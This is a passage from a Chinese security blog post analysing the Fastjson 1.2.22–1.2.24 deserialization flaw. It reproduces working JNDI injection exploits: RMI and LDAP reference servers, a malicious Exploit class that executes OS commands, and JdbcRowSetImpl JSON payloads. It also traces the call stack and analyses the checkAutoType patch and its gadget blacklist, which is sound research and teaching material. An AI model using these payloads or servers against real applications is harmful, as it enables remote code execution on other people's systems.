class="class"><span class="keyword">class</span> <span class="title">JNDIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="comment">//http://127.0.0.1:8000/Exploit.class即可</span></span><br><span class="line">        Reference reference = <span class="keyword">new</span> Reference(<span class="string">"Exloit"</span>,</span><br><span class="line">                <span class="string">"Exploit"</span>,<span class="string">"http://127.0.0.1:8000/"</span>);</span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        registry.bind(<span class="string">"Exploit"</span>,referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Exploit.java，恶意类，单独编译成class文件并放置于RMI服务指向的三方Web服务中，作为一个Factory绑定在注册表服务中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String[] cmds = System.getProperty(<span class="string">"os.name"</span>).toLowerCase().contains(<span class="string">"win"</span>)</span><br><span class="line">                    ? <span class="keyword">new</span> String[]&#123;<span class="string">"cmd.exe"</span>,<span class="string">"/c"</span>, <span class="string">"calc.exe"</span>&#125;</span><br><span class="line">                    : <span class="keyword">new</span> String[]&#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>, <span class="string">"touch /tmp/hacked"</span>&#125;;</span><br><span class="line">            Runtime.getRuntime().exec(cmds);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Exploit e = <span class="keyword">new</span> Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>JdbcRowSetImplPoc.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JdbcRowSetImplPoc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</span><br><span class="line">        String payload = <span class="string">"&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\", \"autoCommit\":true&#125;"</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先运行JNDI的RMI服务，将恶意类Exploit.class单独放置于一个三方的Web服务中，然后运行PoC即可弹计算器，且看到访问了含有恶意类的Web服务：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/25.png" alt=""></p><h4 id="JNDI-LDAP复现利用"><a href="#JNDI-LDAP复现利用" class="headerlink" title="JNDI+LDAP复现利用"></a>JNDI+LDAP复现利用</h4><p>PoC如下，跟RMI的相比只是改了URL而已：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,<span class="attr">"dataSourceName"</span>:<span class="string">"ldap://localhost:1389/Exploit"</span>, <span class="attr">"autoCommit"</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure><p>但是相比RMI的利用方式，优势在于JDK的限制更低了。</p><p>LdapServer.java，区别在于将之前的RMI服务端换成LDAP服务端：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LdapServer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String LDAP_BASE = <span class="string">"dc=example,dc=com"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        String url = <span class="string">"http://127.0.0.1:8000/#Exploit"</span>;</span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">1389</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InMemoryDirectoryServerConfig config = <span class="keyword">new</span> InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> InMemoryListenerConfig(</span><br><span class="line">                    <span class="string">"listen"</span>,</span><br><span class="line">                    InetAddress.getByName(<span class="string">"0.0.0.0"</span>),</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> OperationInterceptor(<span class="keyword">new</span> URL(url)));</span><br><span class="line">            InMemoryDirectoryServer ds = <span class="keyword">new</span> InMemoryDirectoryServer(config);</span><br><span class="line">            System.out.println(<span class="string">"Listening on 0.0.0.0:"</span> + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title">InMemoryOperationInterceptor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">OperationInterceptor</span> <span class="params">( URL cb )</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> </span>&#123;</span><br><span class="line">            String base = result.getRequest().getBaseDN();</span><br><span class="line">            Entry e = <span class="keyword">new</span> Entry(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException </span>&#123;</span><br><span class="line">            URL turl = <span class="keyword">new</span> URL(<span class="keyword">this</span>.codebase, <span class="keyword">this</span>.codebase.getRef().replace(<span class="string">'.'</span>, <span class="string">'/'</span>).concat(<span class="string">".class"</span>));</span><br><span class="line">            System.out.println(<span class="string">"Send LDAP reference result for "</span> + base + <span class="string">" redirecting to "</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">"javaClassName"</span>, <span class="string">"Exploit"</span>);</span><br><span class="line">            String cbstring = <span class="keyword">this</span>.codebase.toString();</span><br><span class="line">            <span class="keyword">int</span> refPos = cbstring.indexOf(<span class="string">'#'</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">"javaCodeBase"</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">"objectClass"</span>, <span class="string">"javaNamingReference"</span>);</span><br><span class="line">            e.addAttribute(<span class="string">"javaFactory"</span>, <span class="keyword">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> LDAPResult(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Exploit.java不变。</p><p>JdbcRowSetImplPoC.java中修改payload中的dataSourceName的值为指向LDAP服务端地址即可：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String payload = <span class="string">"&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1389/Exploit\", \"autoCommit\":true&#125;"</span>;</span><br></pre></td></tr></table></figure><p>和RMI同样的利用方式，能成功弹计算器：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/26.png" alt=""></p><h4 id="调试分析-1"><a href="#调试分析-1" class="headerlink" title="调试分析"></a>调试分析</h4><p>虽然前面两个复现利用是用的不同的服务，但是都是利用了com.sun.rowset.JdbcRowSetImpl这条利用链来触发的，漏洞点都是JNDI注入导致的。</p><p>在<code>JSON.parse(payload);</code>处打下断点开始往下调试。</p><p>前面的函数调用过程和基于TemplateImpl的调试分析几乎是一样的，只看下区别的地方。</p><p>调用scanSymbol()函数扫描到com.sun.rowset.JdbcRowSetImpl类后，再调用TypeUtils.loadClass()函数将该类加载进来：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/27.png" alt=""></p><p>往下调试，调用了FastjsonASMDeserializer.deserialze()函数对该类进行反序列化操作：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/28.png" alt=""></p><p>继续往下调试，就是ASM机制生成的临时代码了，这些代码是下不了断点、也看不到，直接继续往下调试即可。</p><p>由于PoC设置了dataSourceName键值和autoCommit键值，因此在JdbcRowSetImpl中的setDataSourceName()和setAutoCommit()函数都会被调用，因为它们均满足前面说到的Fastjson在反序列化时会自动调用的setter方法的特征。</p><p>先是调试到了setDataSourceName()函数，将dataSourceName值设置为目标RMI服务的地址：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/29.png" alt=""></p><p>接着调用到setAutoCommit()函数，设置autoCommit值，其中调用了connect()函数：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/30.png" alt=""></p><p>跟进connect()函数，看到了熟悉的JNDI注入的代码即<code>InitialContext.lookup()</code>，并且其参数是调用<code>this.getDataSourceName()</code>获取的、即在前面setDataSourceName()函数中设置的值，因此lookup参数外部可控，导致存在JNDI注入漏洞：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/31.png" alt=""></p><p>再往下就是JNDI注入的调用过程了，最后是成功利用JNDI注入触发Fastjson反序列化漏洞、达到任意命令执行效果。</p><p>调试过程的函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">connect:654, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">setAutoCommit:4081, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:57, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:606, Method (java.lang.reflect)</span><br><span class="line">setValue:96, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseRest:922, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:-1, FastjsonASMDeserializer_1_JdbcRowSetImpl (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:137, JSON (com.alibaba.fastjson)</span><br><span class="line">parse:128, JSON (com.alibaba.fastjson)</span><br><span class="line">main:6, JdbcRowSetImplPoc</span><br></pre></td></tr></table></figure><h4 id="一个小问题"><a href="#一个小问题" class="headerlink" title="一个小问题"></a>一个小问题</h4><p>这里漏洞触发点是<code>JSON.parse(payload);</code>，改成用<code>JSON.parse(payload);</code>也是可以成功利用的。</p><p>为啥会这样呢？其实看到之前讲解的parse与parseObject区别就知道了。</p><p>我们将JSON.parse()换成JSON.parseObject()再调试一遍会发现，JSON.parseObject()会调用到JSON.parse()、再调用DefaultJSONParser.parse()，也就是说JSON.parseObject()本质上还是调用JSON.parse()进行反序列化的，区别不过是parseObject()会额外调用JSON.toJSON()来将Java对象专为JSONObject对象。两者的反序列化的操作时一样的，因此都能成功触发。</p><h2 id="0x03-补丁分析"><a href="#0x03-补丁分析" class="headerlink" title="0x03 补丁分析"></a>0x03 补丁分析</h2><p>这里下载1.2.25版本的jar包看下是怎么修补的。</p><h3 id="checkAutoType"><a href="#checkAutoType" class="headerlink" title="checkAutoType()"></a>checkAutoType()</h3><p>修补方案就是将DefaultJSONParser.parseObject()函数中的<code>TypeUtils.loadClass</code>替换为checkAutoType()函数：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/33.png" alt=""></p><p>看下checkAutoType()函数，具体的可看注释：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class="line">    <span class="keyword">if</span> (typeName == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> String className = typeName.replace(<span class="string">'$'</span>, <span class="string">'.'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// autoTypeSupport默认为False</span></span><br><span class="line">    <span class="comment">// 当autoTypeSupport开启时，先白名单过滤，匹配成功即可加载该类，否则再黑名单过滤</span></span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">            String accept = acceptList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                <span class="keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">            String deny = denyList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从Map缓存中获取类，注意这是后面版本的漏洞点</span></span><br><span class="line">    Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">        clazz = deserializers.findClass(typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当autoTypeSupport未开启时，先黑名单过滤，再白名单过滤，若白名单匹配上则直接加载该类，否则报错</span></span><br><span class="line">    <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">            String deny = denyList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">            String accept = acceptList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">        clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) <span class="comment">// classloader is danger</span></span><br><span class="line">            || DataSource.class.isAssignableFrom(clazz) <span class="comment">// dataSource can load jdbc driver</span></span><br><span class="line">           ) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单地说，checkAutoType()函数就是使用黑白名单的方式对反序列化的类型继续过滤，acceptList为白名单（默认为空，可手动添加），denyList为黑名单（默认不为空）。</p><p>默认情况下，autoTypeSupport为False，即先进行黑名单过滤，遍历denyList，如果引入的库以denyList中某个deny开头，就会抛出异常，中断运行。</p><p>denyList黑名单中列出了常见的反序列化漏洞利用链Gadgets：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">bsh</span><br><span class="line">com.mchange</span><br><span class="line">com.sun.</span><br><span class="line">java.lang.Thread</span><br><span class="line">java.net.Socket</span><br><span class="line">java.rmi</span><br><span class="line">javax.xml</span><br><span class="line">org.apache.bcel</span><br><span class="line">org.apache.commons.beanutils</span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">org.apache.commons.collections.functors</span><br><span class="line">org.apache.commons.collections4.comparators</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.myfaces.context.servlet</span><br><span class="line">org.apache.tomcat</span><br><span class="line">org.apache.wicket.util</span><br><span class="line">org.codehaus.groovy.runtime</span><br><span class="line">org.hibernate</span><br><span class="line">org.jboss</span><br><span class="line">org.mozilla.javascript</span><br><span class="line">org.python.core</span><br><span class="line">org.springframework</span><br></pre></td></tr></table></figure><p>这里可以看到黑名单中包含了”com.sun.”，这就把我们前面的几个利用链都给过滤了，成功防御了。</p><p>运行能看到报错信息，说autoType不支持该类：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/32.png" alt=""></p><p>调试分析看到，就是在checkAutoType()函数中未开启autoTypeSupport即默认设置的场景下被黑名单过滤了从而导致抛出异常程序终止的：</p><p><img src="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/34.png" alt=""></p><h3 id="autoTypeSupport"><a href="#autoTypeSupport" class="headerlink" title="autoTypeSupport"></a>autoTypeSupport</h3><p>autoTypeSupport是checkAutoType()函数出现后ParserConfig.java中新增的一个配置选项，在checkAutoType()函数的某些代码逻辑起到开关的作用。</p><p>默认情况下autoTypeSupport为False，将其设置为True有两种方法：</p><ul><li>JVM启动参数：<code>-Dfastjson.parser.autoTypeSupport=true</code></li><li>代码中设置：<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code>，如果有使用非全局ParserConfig则用另外调用<code>setAutoTypeSupport(true);</code></li></ul><p>AutoType白名单设置方法：</p><ol><li>JVM启动参数：<code>-Dfastjson.parser.autoTypeAccept=com.xx.a.,com.yy.</code></li><li>代码中设置：<code>ParserConfig.getGlobalInstance().addAccept(&quot;com.xx.a&quot;);</code></li><li>通过fastjson.properties文件配置。在1.2.25/1.2.26版本支持通过类路径的fastjson.properties文件来配置，配置方式如下：<code>fastjson.parser.autoTypeAccept=com.taobao.pac.client.sdk.dataobject.,com.cainiao.</code></li></ol><hr><p>OK，Fastjson 1.2.22-1.2.24 反序列化漏洞分析到这，接下来一篇就写对各个补丁版本的checkAutoType()黑名单绕过。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
